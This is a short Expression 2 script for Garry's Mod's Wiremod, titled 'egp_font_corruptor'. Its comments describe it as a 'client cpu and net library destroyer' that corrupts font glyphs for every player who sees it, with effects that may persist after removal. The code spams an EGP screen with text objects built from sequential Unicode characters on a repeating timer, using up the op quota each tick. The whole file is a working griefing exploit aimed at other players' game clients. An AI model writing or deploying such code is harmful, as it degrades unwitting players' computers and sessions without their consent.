@name exploits/egp_font_corruptor
@inputs EGP:wirelink
@persist State Instances Char OBJECT_AMOUNT OBJECT_SIZE RERUN_CHANCE

# by Fasteroid
# client cpu and net library destroyer
# corrupts random font character glyphs for all who witness
# the effects can linger after removal

if( first() ){
    OBJECT_AMOUNT = 128
    OBJECT_SIZE   = 48
    INTERVAL      = 100
    RERUN_CHANCE  = 0.001
    timer("kek",INTERVAL)
    Instances = Char = 0 # stupid warnings
}

function string genWingdings(N:number){
    R = array()
    for(I=1,N){
        R[I,number] = Char
        Char+=1
        if(random() < RERUN_CHANCE){ Char = 0 }
    }
    return toUnicodeChar(R)
}

if( ->EGP ){
    State = 1
}

if(clk("kek")){
    timer("kek",INTERVAL)
    if( State ){
        local Lines = 0
        while( opcounter() < softQuota() & Lines < 32 ){
            EGP:egpText(Instances+1, genWingdings(OBJECT_SIZE), vec2(0,(Instances%32)*16))
            Instances = (Instances + 1) % OBJECT_AMOUNT
            Lines++
        }        
    }
}
